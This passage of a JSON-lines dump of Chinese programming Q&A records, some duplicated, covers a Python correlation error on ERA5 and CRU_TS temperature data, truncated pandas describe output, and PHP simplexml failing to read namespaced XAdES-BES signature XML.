'G:\\\\Data\\\\TP_and_2mT_1950-1978_Monthly.nc'\nfile_A = 'G:\\\\Data\\\\cru_ts4.04.1901.2019.tmp.dat.nc'\na = Dataset(file_0)\nb = Dataset(file_A)\nt2m = a.variables[\"t2m\"][:]\ntmp = b.variables[\"tmp\"][:]\nt2m = t2m[-1]\nnum = 1\nnum0 = 1\nfor i in range(720):\n    t2m = np.delete(t2m, num, axis=1)\n    num = num + 1\nfor i in range(360):\n    t2m = np.delete(t2m, num0, axis=0)\n    num0 = num0 + 1\nt2m = np.delete(t2m, -1, axis=0)\nt2m = t2m - 273.15\nt2m_xin = []\nfor i in range(0, len(t2m)):\n    for j in t2m[i]:\n        t2m_xin.append(j)\ntmp = tmp[935]\ntmp_new = []\nfor i in range(0, len(tmp)):\n    for j in tmp[i]:\n        tmp_new.append(j)\nera5_list = t2m_xin\ncru_ts_list = tmp_new\n\ng_s_m = pd.Series(era5_list)  # 利用Series将列表转换成新的、pandas可处理的数据\ng_a_d = pd.Series(cru_ts_list)\n\ncorr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数\n\nprint('corr_gust :', corr_gust)\n# 最后画一下两列表散点图，直观感受下，结合相关系数揣摩揣摩\nplt.scatter(era5_list, cru_ts_list)\nplt.title('corr_gust :' + str(corr_gust), fontproperties='SimHei')  # 给图写上title\nplt.show()", "\n\n", "报错：", "\n\n", "Traceback (most recent call last):", "\n  File \"G:\\Data_dispose\\CC.py\",", " line 37", ", in <module>", "\n    corr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\series.py\", line 2327, in corr", "\n    return nanops.nancorr(", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 71, in _f", "\n    return f(*args, **kwargs)", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 1459, in nancorr", "\n    return f(a, b)", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 1480, in func", "\n    return np.corrcoef(a, b)[0, 1]", "\n  File \"<__array_function__ internals>\", line 5, in corrcoef", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 2551, in corrcoef", "\n    c = cov(x, y, rowvar)", "\n  File \"<__array_function__ internals>\", line 5, in cov", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 2456, in cov", "\n    avg, w_sum = average(X, axis=1, weights=w, returned=True)", "\n  File \"<__array_function__ internals>\", line 5, in average", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 415, in average", "\n    if scl.shape != avg.shape:", "\nAttributeError: ", "'float' object has no attribute 'shape'", "\n\n", "随后，我用简单的数据类型转换，通过遍历列表里的数据，变成float类型数据，代码如下", "（第31-34行改动）", "，", "\n\n", "\n", "import pandas as pd\nimport pylab as plt\nfrom netCDF4 import Dataset\nimport numpy as np\nfile_0 = 'G:\\\\Data\\\\TP_and_2mT_1950-1978_Monthly.nc'\nfile_A = 'G:\\\\Data\\\\cru_ts4.04.1901.2019.tmp.dat.nc'\na = Dataset(file_0)\nb = Dataset(file_A)\nt2m = a.variables[\"t2m\"][:]\ntmp = b.variables[\"tmp\"][:]\nt2m = t2m[-1]\nnum = 1\nnum0 = 1\nfor i in range(720):\n    t2m = np.delete(t2m, num, axis=1)\n    num = num + 1\nfor i in range(360):\n    t2m = np.delete(t2m, num0, axis=0)\n    num0 = num0 + 1\nt2m = np.delete(t2m, -1, axis=0)\nt2m = t2m - 273.15\nt2m_xin = []\nfor i in range(0, len(t2m)):\n    for j in t2m[i]:\n        t2m_xin.append(j)\ntmp = tmp[935]\ntmp_new = []\nfor i in range(0, len(tmp)):\n    for j in tmp[i]:\n        tmp_new.append(j)\ntmp_new_0 = []\nfor k in range(len(tmp_new)):\n    k = float(k)\n    tmp_new_0.append(k)\nera5_list = t2m_xin\ncru_ts_list = tmp_new_0\n\ng_s_m = pd.Series(era5_list)  # 利用Series将列表转换成新的、pandas可处理的数据\ng_a_d = pd.Series(cru_ts_list)\n\ncorr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数\n\nprint('corr_gust :', corr_gust)\n# 最后画一下两列表散点图，直观感受下，结合相关系数揣摩揣摩\nplt.scatter(era5_list, cru_ts_list)\nplt.title('corr_gust :' + str(corr_gust), fontproperties='SimHei')  # 给图写上title\nplt.show()", "\n\n", "确实没有报错，但是", "CRU_TS v4.04", "的", "数据已经发生改变", "，结果完全不符合实际情况，如图：", "\n\n", "\n\n", "可以看出横坐标为ERA5的气温数据正常，纵坐标数据已经“废了”，为什么会这样？这么解决？刚入门编程不到半年的小白向大佬们请教。"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;&lt;strong&gt;g_s_m.corr(g_a_d),类型转换一下&lt;/strong&gt;&lt;/p&gt;\n\n&lt;p&gt;g_s_m &amp;#61; pd.Series(era5_list&amp;#xff0c;dtype&amp;#61;np.float64)&lt;/p&gt;\n\n&lt;p&gt; &lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["数据处理时出现'float' object has no attribute 'shape'怎么办？", ["我在用Python处理气象数据时出现的问题。按照工作需要，我在对ERA5（下载链接：链接：", "https://pan.baidu.com/s/1alH1cLXOAGYMz67dPdoZ2w ", " 提取码：", "c4b2", " ）和", "CRU_TS v4.04", "（下载链接：链接：", "https://pan.baidu.com/s/1c4IVFI-jetxuEThaCqml1g", " 提取码：", "w5r0 ", "）的气温数据进行分析，计算", "相关系数（CC）", "，后面计算的代码来源于网络，前面的代码作用的统一经纬度分辨率（把ERA5经纬度统一成与CRU_TS v4.04一样的0.5度乘0.5度），现在确认在统一经纬度分辨率没有问题。", "CRU_TS v4.04", "没有海洋和南极地区的数据，所以存在", "NaN空值", "，在如下的代码运算之后，", "\n\n", "\n", "import pandas as pd\nimport pylab as plt\nfrom netCDF4 import Dataset\nimport numpy as np\nfile_0 = 'G:\\\\Data\\\\TP_and_2mT_1950-1978_Monthly.nc'\nfile_A = 'G:\\\\Data\\\\cru_ts4.04.1901.2019.tmp.dat.nc'\na = Dataset(file_0)\nb = Dataset(file_A)\nt2m = a.variables[\"t2m\"][:]\ntmp = b.variables[\"tmp\"][:]\nt2m = t2m[-1]\nnum = 1\nnum0 = 1\nfor i in range(720):\n    t2m = np.delete(t2m, num, axis=1)\n    num = num + 1\nfor i in range(360):\n    t2m = np.delete(t2m, num0, axis=0)\n    num0 = num0 + 1\nt2m = np.delete(t2m, -1, axis=0)\nt2m = t2m - 273.15\nt2m_xin = []\nfor i in range(0, len(t2m)):\n    for j in t2m[i]:\n        t2m_xin.append(j)\ntmp = tmp[935]\ntmp_new = []\nfor i in range(0, len(tmp)):\n    for j in tmp[i]:\n        tmp_new.append(j)\nera5_list = t2m_xin\ncru_ts_list = tmp_new\n\ng_s_m = pd.Series(era5_list)  # 利用Series将列表转换成新的、pandas可处理的数据\ng_a_d = pd.Series(cru_ts_list)\n\ncorr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数\n\nprint('corr_gust :', corr_gust)\n# 最后画一下两列表散点图，直观感受下，结合相关系数揣摩揣摩\nplt.scatter(era5_list, cru_ts_list)\nplt.title('corr_gust :' + str(corr_gust), fontproperties='SimHei')  # 给图写上title\nplt.show()", "\n\n", "报错：", "\n\n", "Traceback (most recent call last):", "\n  File \"G:\\Data_dispose\\CC.py\",", " line 37", ", in <module>", "\n    corr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\series.py\", line 2327, in corr", "\n    return nanops.nancorr(", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 71, in _f", "\n    return f(*args, **kwargs)", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 1459, in nancorr", "\n    return f(a, b)", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 1480, in func", "\n    return np.corrcoef(a, b)[0, 1]", "\n  File \"<__array_function__ internals>\", line 5, in corrcoef", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 2551, in corrcoef", "\n    c = cov(x, y, rowvar)", "\n  File \"<__array_function__ internals>\", line 5, in cov", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 2456, in cov", "\n    avg, w_sum = average(X, axis=1, weights=w, returned=True)", "\n  File \"<__array_function__ internals>\", line 5, in average", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 415, in average", "\n    if scl.shape != avg.shape:", "\nAttributeError: ", "'float' object has no attribute 'shape'", "\n\n", "随后，我用简单的数据类型转换，通过遍历列表里的数据，变成float类型数据，代码如下", "（第31-34行改动）", "，", "\n\n", "\n", "import pandas as pd\nimport pylab as plt\nfrom netCDF4 import Dataset\nimport numpy as np\nfile_0 = 'G:\\\\Data\\\\TP_and_2mT_1950-1978_Monthly.nc'\nfile_A = 'G:\\\\Data\\\\cru_ts4.04.1901.2019.tmp.dat.nc'\na = Dataset(file_0)\nb = Dataset(file_A)\nt2m = a.variables[\"t2m\"][:]\ntmp = b.variables[\"tmp\"][:]\nt2m = t2m[-1]\nnum = 1\nnum0 = 1\nfor i in range(720):\n    t2m = np.delete(t2m, num, axis=1)\n    num = num + 1\nfor i in range(360):\n    t2m = np.delete(t2m, num0, axis=0)\n    num0 = num0 + 1\nt2m = np.delete(t2m, -1, axis=0)\nt2m = t2m - 273.15\nt2m_xin = []\nfor i in range(0, len(t2m)):\n    for j in t2m[i]:\n        t2m_xin.append(j)\ntmp = tmp[935]\ntmp_new = []\nfor i in range(0, len(tmp)):\n    for j in tmp[i]:\n        tmp_new.append(j)\ntmp_new_0 = []\nfor k in range(len(tmp_new)):\n    k = float(k)\n    tmp_new_0.append(k)\nera5_list = t2m_xin\ncru_ts_list = tmp_new_0\n\ng_s_m = pd.Series(era5_list)  # 利用Series将列表转换成新的、pandas可处理的数据\ng_a_d = pd.Series(cru_ts_list)\n\ncorr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数\n\nprint('corr_gust :', corr_gust)\n# 最后画一下两列表散点图，直观感受下，结合相关系数揣摩揣摩\nplt.scatter(era5_list, cru_ts_list)\nplt.title('corr_gust :' + str(corr_gust), fontproperties='SimHei')  # 给图写上title\nplt.show()", "\n\n", "确实没有报错，但是", "CRU_TS v4.04", "的", "数据已经发生改变", "，结果完全不符合实际情况，如图：", "\n\n", "\n\n", "可以看出横坐标为ERA5的气温数据正常，纵坐标数据已经“废了”，为什么会这样？这么解决？刚入门编程不到半年的小白向大佬们请教。"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;用pandas 试试&lt;/p&gt;\n&lt;p&gt;pd.set_option(&amp;#39;display.max_columns&amp;#39;, 1000) #显示完整的列&lt;br /&gt;pd.set_option(&amp;#39;display.max_rows&amp;#39;, None) #显示完整的行&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["Python describe 显示不完全的问题要怎么解决", ["python", "在Python中对数据框进行describe的时候，如果字段稍微多一些，则会将一些列自动省略掉，", "在网上查了一些方法，比如：", "import numpy as np", "\n", "np.set_printoptions(threshold=np.inf)", "但是对于describe无效", "使用转置也同样不行", "如何解决这个问题？图片说明", "或者有什么替代方案？", "谢谢！"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;用pandas 试试&lt;/p&gt;\n&lt;p&gt;pd.set_option(&amp;#39;display.max_columns&amp;#39;, 1000) #显示完整的列&lt;br /&gt;pd.set_option(&amp;#39;display.max_rows&amp;#39;, None) #显示完整的行&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["Python describe 显示不完全的问题要怎么解决", ["python", "在Python中对数据框进行describe的时候，如果字段稍微多一些，则会将一些列自动省略掉，", "在网上查了一些方法，比如：", "import numpy as np", "\n", "np.set_printoptions(threshold=np.inf)", "但是对于describe无效", "使用转置也同样不行", "如何解决这个问题？图片说明", "或者有什么替代方案？", "谢谢！"]], "Tag": "算法设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;Thanks to the &lt;a href=\"https://stackoverflow.com/questions/35435626/simplexml-load-string-doesnt-fully-load-xades-bes-signature-xml?noredirect=1#comment58599247_35435626\"&gt;michi's comment&lt;/a&gt;, I found a solution. Namespaced nodes should be accessed differently than nodes without namespace.&lt;/p&gt;\n\n&lt;p&gt;So, basing on the example above, when I want to use Signature node, I can do it like this:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;$xml = simplexml_load_string($content);\n$signatureNode = $xml-&amp;gt;children('ds', true)-&amp;gt;Signature;\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "NP完全问题", "Question": ["sImplexml_load_string未完全加载XAdES-BES签名XML", ["\n\n", "I've got XML containing XAdES-BES digita signature:", "\n\n", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Signatures Id=\"ID-222cf3cf-0f0b-49d2-b7cb-4cf47bb373cb\">\n   <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\" Id=\"ID-9a61610b-c8e3-4201-bf41-a174cbc21634\">\n      <ds:SignedInfo Id=\"ID-8ebe3e85-1413-4fec-a14c-7264546ab770\">\n         <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/TR/2001/REC-xml-c14n-20010315\" />\n         <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\" />\n         <ds:Reference Id=\"ID-e751928b-6823-47ad-a5ae-b7ccdf301751\" URI=\"#ID-e37958b8-134c-4f51-9b25-8274fd1edce7\">\n            <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\" />\n            <ds:DigestValue>Z7q3zqS5FTNPP/mj0rDmUV5PdZQ=</ds:DigestValue>\n         </ds:Reference>\n         <ds:Reference Id=\"ID-396858b0-7e4b-42e1-ba5f-18368f90f0df\" URI=\"#ID-90b9721b-1d1c-4104-ae2c-ebb6b251cf2b\" Type=\"http://uri.etsi.org/01903#SignedProperties\">\n            <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\" />\n            <ds:DigestValue>H7EeV4pPoJ6WhWFnVSo3WNu3Yj8=</ds:DigestValue>\n         </ds:Reference>\n      </ds:SignedInfo>\n      <ds:SignatureValue Id=\"ID-949000f9-85bc-435e-b387-8f7aa5551d75\">a0cc/hQYjmwQC8ssBzolLyArUqOVi+s6cP+lbxku69qGleBUroQlvD6o+GpIxSJB6wlWwic3YjuxDxn9\nmfW2jCLYEEM1RB277ChnHASakC+vbBP03LWC+GxsOe0seKMVsCc0EPwS5kk5RfvrUN6sTxWSW/2MOIXG\n4fW1cAtjh1SjDN9Ij38SIuWpW8guJ9EGEVyTUuTiZ5dbpHfxftgKfHmr16aMpXk0ta46X2UuGTQRB+E/\n0W+RpLqdmTP5VG0CxT8Z2H4n6puGL0yC20SsZZDethL/Vnr67EXTPmHFUwoZOGNu+0IFdBJW4HvLA5rF\nczL82MOsCoFXqzMVxGxiqw==</ds:SignatureValue>\n      <ds:KeyInfo>\n         <ds:KeyValue>\n            <ds:RSAKeyValue>\n               <ds:Modulus>AL4k+zz02RytjonBY0af0dfuuDJhNg0dypClqzkLyyLjkTa9QUbtdtA20lRuogjFqb6CVpqQ/PEdXDK5\nbN6qGBQGsmdqkgru6A8aAc57QawEcbEL+rDue1L+mqM/JVnr+DAWOehITd8HzS0JQTQcxF1Lv0L1GNbJ\nP8/bo8Coj2EVtKZ9tBI9+AZUdZ11uKBYj9uvKy0VGufjoljIIrQASIft4nw8a/WF+beEYOrl3PqnBcAo\nLc/CJiNsnsASws0a/EKuaP3vQbIo36s7FVH7U4x/8ypcAPsmtgi9LbH+v9Ugc2CiCj7krJIT3X9EwkjC\nFUq+MykmVvfW0D0bOTP2X5k=</ds:Modulus>\n               <ds:Exponent>AQAB</ds:Exponent>\n            </ds:RSAKeyValue>\n         </ds:KeyValue>\n         <ds:X509Data>\n            <ds:X509Certificate>MIIGETCCBPmgAwIBAgIUaQ+g3SS0YfvHQus43mbJ+4FSYegwDQYJKoZIhvcNAQEFBQAwczELMAkGA1UE\nBhMCUEwxKDAmBgNVBAoMH0tyYWpvd2EgSXpiYSBSb3psaWN6ZW5pb3dhIFMuQS4xJDAiBgNVBAMMG0NP\nUEUgU1pBRklSIC0gS3dhbGlmaWtvd2FueTEUMBIGA1UEBRMLTnIgd3Bpc3U6IDYwHhcNMTUxMDA4MTIw\nMDAwWhcNMTYxMDA4MTIwMDAwWjB2MQswCQYDVQQGEwJQTDEbMBkGA1UEBRMSUEVTRUw6IDg2MDYxMzE0\nMzk3MR8wHQYDVQQDDBZLYW1pbCBTZWJhc3RpYW4gTWlqYWN6MRgwFgYDVQQqDA9LYW1pbCBTZWJhc3Rp\nYW4xDzANBgNVBAQMBk1pamFjejCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL4k+zz02Ryt\njonBY0af0dfuuDJhNg0dypClqzkLyyLjkTa9QUbtdtA20lRuogjFqb6CVpqQ/PEdXDK5bN6qGBQGsmdq\nkgru6A8aAc57QawEcbEL+rDue1L+mqM/JVnr+DAWOehITd8HzS0JQTQcxF1Lv0L1GNbJP8/bo8Coj2EV\ntKZ9tBI9+AZUdZ11uKBYj9uvKy0VGufjoljIIrQASIft4nw8a/WF+beEYOrl3PqnBcAoLc/CJiNsnsAS\nws0a/EKuaP3vQbIo36s7FVH7U4x/8ypcAPsmtgi9LbH+v9Ugc2CiCj7krJIT3X9EwkjCFUq+MykmVvfW\n0D0bOTP2X5kCAwEAAaOCApgwggKUMAwGA1UdEwEB/wQCMAAwggFPBgNVHSABAf8EggFDMIIBPzCCATsG\nCSqEaAGG9yMBATCCASwwgd0GCCsGAQUFBwICMIHQDIHNRGVrbGFyYWNqYSB0YSBqZXN0IG/Fm3dpYWRj\nemVuaWVtIHd5ZGF3Y3ksIMW8ZSB0ZW4gY2VydHlmaWthdCB6b3N0YcWCIHd5ZGFueSBqYWtvIGNlcnR5\nZmlrYXQga3dhbGlmaWtvd2FueSB6Z29kbmllIHogd3ltYWdhbmlhbWkgdXN0YXd5IG8gcG9kcGlzaWUg\nZWxla3Ryb25pY3pueW0gb3JheiB0b3dhcnp5c3rEhWN5bWkgamVqIHJvenBvcnrEhWR6ZW5pYW1pLjBK\nBggrBgEFBQcCARY+aHR0cDovL3d3dy5lbGVrdHJvbmljem55cG9kcGlzLnBsL2luZm9ybWFjamUvZG9r\ndW1lbnR5LWktdW1vd3kwCQYDVR0JBAIwADAhBgNVHREEGjAYgRZrYW1pbC5taWphY3pAZ21haWwuY29t\nMA4GA1UdDwEB/wQEAwIGQDCBsAYDVR0jBIGoMIGlgBTMQSp2mC5KehnakTbf2H85P9TCrqF3pHUwczEL\nMAkGA1UEBhMCUEwxKDAmBgNVBAoMH0tyYWpvd2EgSXpiYSBSb3psaWN6ZW5pb3dhIFMuQS4xJDAiBgNV\nBAMMG0NPUEUgU1pBRklSIC0gS3dhbGlmaWtvd2FueTEUMBIGA1UEBRMLTnIgd3Bpc3U6IDaCFH18c1x7\nvNOu01acH+WfGYiAcun0MEAGA1UdHwQ5MDcwNaAzoDGGL2h0dHA6Ly9lbGVrdHJvbmljem55cG9kcGlz\nLnBsL2NybC9jcmxfb3prNTIuY3JsMA0GCSqGSIb3DQEBBQUAA4IBAQAP0zddWprl5hpXiIiMGcC5D7ob\n/nj3wvfOUm0QCf7+ZEorfr6EC96B6F/cNtZ1wXtAQXkf5Zm3gPhbKXY6XWM2NDWadZrDV9zV75Ab06dQ\n5qmDfuMGTfPUdH3+QBmW7YnniWPCGuMzGNlP9DpZ45YrgRnwlsZSHMhX0HiEeDfYKAkGhIaJ7lcPlZrj\nzWBdhUOgYm06pYf8NEKVWzu808iIHIvCBot0ADcZ8ypxDyQsco/RSRGY0EO8FATCH3j2Oe/+7FGRjRQK\nXczBsKu6G8GQ6b/eGuWD7NNAuBX4UJu9jXRo9mzo7zKj01/SPfE4kHTHfHr9yi9BBkzAmaAxQpT5</ds:X509Certificate>\n         </ds:X509Data>\n      </ds:KeyInfo>\n      <ds:Object>\n         <xades:QualifyingProperties xmlns:xades=\"http://uri.etsi.org/01903/v1.3.2#\" Id=\"ID-04b0ddeb-914c-419f-acb2-780dae2ee890\" Target=\"#ID-9a61610b-c8e3-4201-bf41-a174cbc21634\">\n            <xades:SignedProperties Id=\"ID-90b9721b-1d1c-4104-ae2c-ebb6b251cf2b\">\n               <xades:SignedSignatureProperties>\n                  <xades:SigningTime>2015-12-08T13:37:16Z</xades:SigningTime>\n                  <xades:SigningCertificate>\n                     <xades:Cert>\n                        <xades:CertDigest>\n                           <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\" />\n                           <ds:DigestValue>+6UE5SSks6Cn6++o8CAkSO/NMWk=</ds:DigestValue>\n                        </xades:CertDigest>\n                        <xades:IssuerSerial>\n                           <ds:X509IssuerName>serialNumber=Nr wpisu: 6,CN=COPE SZAFIR - Kwalifikowany,O=Krajowa Izba Rozliczeniowa S.A.,C=PL</ds:X509IssuerName>\n                           <ds:X509SerialNumber>599792555331422089182929030726347827824527827432</ds:X509SerialNumber>\n                        </xades:IssuerSerial>\n                     </xades:Cert>\n                  </xades:SigningCertificate>\n               </xades:SignedSignatureProperties>\n               <xades:SignedDataObjectProperties>\n                  <xades:DataObjectFormat ObjectReference=\"#ID-e751928b-6823-47ad-a5ae-b7ccdf301751\">\n                     <xades:Description>Dokument w formacie xml [XML]</xades:Description>\n                     <xades:MimeType>text/plain</xades:MimeType>\n                     <xades:Encoding>http://www.w3.org/2000/09/xmldsig#base64</xades:Encoding>\n                  </xades:DataObjectFormat>\n               </xades:SignedDataObjectProperties>\n            </xades:SignedProperties>\n         </xades:QualifyingProperties>\n      </ds:Object>\n      <ds:Object Encoding=\"http://www.w3.org/2000/09/xmldsig#base64\" Id=\"ID-e37958b8-134c-4f51-9b25-8274fd1edce7\" MimeType=\"text/plain\">PFRyZXNjUGlzbWE+DQogIDxTeWduYXR1cmFBa3Q+QUJDWFlaMTIzPC9TeWduYXR1cmFBa3Q+DQogIDxQ\nb2RtaW90eT4NCiAgICA8UG9kbWlvdD4NCiAgICAgIDxPc29iYUZpenljem5hPg0KICAgICAgICA8SW1p\nZT5KYW51c3o8L0ltaWU+DQogICAgICAgIDxOYXp3aXNrbz5Ob3dhazwvTmF6d2lza28+DQogICAgICAg\nIDxPem5hY3plbmllPg0KICAgICAgICAgIDxQZXNlbD44OTEwMDEwMDYxNjwvUGVzZWw+DQogICAgICAg\nIDwvT3puYWN6ZW5pZT4NCiAgICAgIDwvT3NvYmFGaXp5Y3puYT4NCiAgICA8L1BvZG1pb3Q+DQogIDwv\nUG9kbWlvdHk+DQogIDxQb2RzdGF3YVByYXduYT4NCiAgICA8UG9kc3Rhd2E+UFBfMDA0PC9Qb2RzdGF3\nYT4NCiAgPC9Qb2RzdGF3YVByYXduYT4NCjwvVHJlc2NQaXNtYT4=</ds:Object>\n   </ds:Signature>\n</Signatures>\n", "\n\n", "When I load it with simplexml_load_string, var_dump shows:", "\n\n", "object(SimpleXMLElement)#212 (1) {\n  [\"@attributes\"] => array(1) {\n    [\"Id\"] => string(39) \"ID-222cf3cf-0f0b-49d2-b7cb-4cf47bb373cb\"\n  }\n}\n", "\n\n", "There's no nested nodes of \"Signatures\" data.", "\n\n", "However, when I remove \"ds\" namespaces from tags, it works great.", "\n\n", "How can I get them without changing document?", "\n    "]], "Tag": "算法设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;Thanks to the &lt;a href=\"https://stackoverflow.com/questions/35435626/simplexml-load-string-doesnt-fully-load-xades-bes-signature-xml?noredirect=1#comment58599247_35435626\"&gt;michi's comment&lt;/a&gt;, I found a solution. Namespaced nodes should be accessed differently than nodes without namespace.&lt;/p&gt;\n\n&lt;p&gt;So, basing on the example above, when I want to use Signature node, I can do it like this:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;$xml = simplexml_load_string($content);\n$signatureNode = $xml-&amp;gt;children('ds', true)-&amp;gt;Signature;\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "NP完全问题", "Question": ["sImplexml_load_string未完全加载XAdES-BES签名XML", ["\n\n", "I've got XML containing XAdES-BES digita signature:", "\n\n", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Signatures Id=\"ID-222cf3cf-0f0b-49d2-b7cb-4cf47bb373cb\">\n   <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\" Id=\"ID-9a61610b-c8e3-4201-bf41-a174cbc21634\">\n      <ds:SignedInfo Id=\"ID-8ebe3e85-1413-4fec-a14c-7264546ab770\">\n         <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/TR/2001/REC-xml-c14n-20010315\" />\n         <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\" />\n         <ds:Reference Id=\"ID-e751928b-6823-47ad-a5ae-b7ccdf301751\" URI=\"#ID-e37958b8-134c-4f51-9b25-8274fd1edce7\">\n            <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\" />\n            <ds:DigestValue>Z7q3zqS5FTNPP/mj0rDmUV5PdZQ=</ds:DigestValue>\n         </ds:Reference>\n         <ds:Reference Id=\"ID-396858b0-7e4b-42e1-ba5f-18368f90f0df\" URI=\"#ID-90b9721b-1d1c-4104-ae2c-ebb6b251cf2b\" Type=\"http://uri.etsi.org/01903#SignedProperties\">\n            <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\" />\n            <ds:DigestValue>H7EeV4pPoJ6WhWFnVSo3WNu3Yj8=</ds:DigestValue>\n         </ds:Reference>\n      </ds:SignedInfo>\n      <ds:SignatureValue Id=\"ID-949000f9-85bc-435e-b387-8f7aa5551d75\">a0cc/hQYjmwQC8ssBzolLyArUqOVi+s6cP+lbxku69qGleBUroQlvD6o+GpIxSJB6wlWwic3YjuxDxn9\nmfW2jCLYEEM1RB277ChnHASakC+vbBP03LWC+GxsOe0seKMVsCc0EPwS5kk5RfvrUN6sTxWSW/2MOIXG\n4fW1cAtjh1SjDN9Ij38SIuWpW8guJ9EGEVyTUuTiZ5dbpHfxftgKfHmr16aMpXk0ta46X2UuGTQRB+E/\n0W+RpLqdmTP5VG0CxT8Z2H4n6puGL0yC20SsZZDethL/Vnr67EXTPmHFUwoZOGNu+0IFdBJW4HvLA5rF\nczL82MOsCoFXqzMVxGxiqw==</ds:SignatureValue>\n      <ds:KeyInfo>\n         <ds:KeyValue>\n            <ds:RSAKeyValue>\n               <ds:Modulus>AL4k+zz02RytjonBY0af0dfuuDJhNg0dypClqzkLyyLjkTa9QUbtdtA20lRuogjFqb6CVpqQ/PEdXDK5\nbN6qGBQGsmdqkgru6A8aAc57QawEcbEL+rDue1L+mqM/JVnr+DAWOehITd8HzS0JQTQcxF1Lv0L1GNbJ\nP8/bo8Coj2EVtKZ9tBI9+AZUdZ11uKBYj9uvKy0VGufjoljIIrQASIft4nw8a/WF+beEYOrl3PqnBcAo\nLc/CJiNsnsASws0a/EKuaP3vQbIo36s7FVH7U4x/8ypcAPsmtgi9LbH+v9Ugc2CiCj7krJIT3X9EwkjC\nFUq+MykmVvfW0D0bOTP2X5k=</ds:Modulus>\n               <ds:Exponent>AQAB</ds:Exponent>\n            </ds:RSAKeyValue>\n         </ds:KeyValue>\n         <ds:X509Data>\n            